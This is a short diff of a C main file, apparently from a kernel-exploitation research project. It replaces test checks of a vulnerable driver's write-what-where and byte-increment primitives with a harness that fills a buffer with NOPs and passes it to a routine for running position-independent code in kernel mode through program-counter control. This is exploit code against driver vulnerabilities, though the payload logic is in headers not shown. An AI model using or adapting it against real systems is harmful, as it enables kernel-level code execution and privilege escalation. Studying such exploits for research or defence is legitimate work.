@@ -1,15 +1,16 @@
+#pragma once
 #include "Vulnerabilities.h"
+#include "Exploitation Methods.h"
 #include <stdio.h>
+
+#define PIC_SIZE 0x500
+
 int main() {
 
-	int test = 0;
+	PBYTE pic = (PBYTE)malloc(0x500);
 	
-	VulnerableDriverWriteWhatWhere((UINT64)5, (UINT64)&test);
-	printf("Vulnerable Driver Write What Where vulnerbility trigger was %s\n", test == 5 ? "succefull" : "pure failure");
-	
-	test = 0;
-	VulnerableDriverIncrementArbitraryByte((UINT64)&test);
-	printf("Vulnerable Driver Increment Arbitrary Byte vulnerbility trigger was %s\n", test == 1 ? "succefull" : "pure failure");
-	
+	memset(pic, 0x90, PIC_SIZE); //initialize with nops
+	vtableSelfReferenceKernelModePicExecutor(VulnerableDriverControlProgramCounter, VulnerableDriverWriteWhatWhere, (PBYTE)pic, PIC_SIZE);
+
 	return 0;
 }
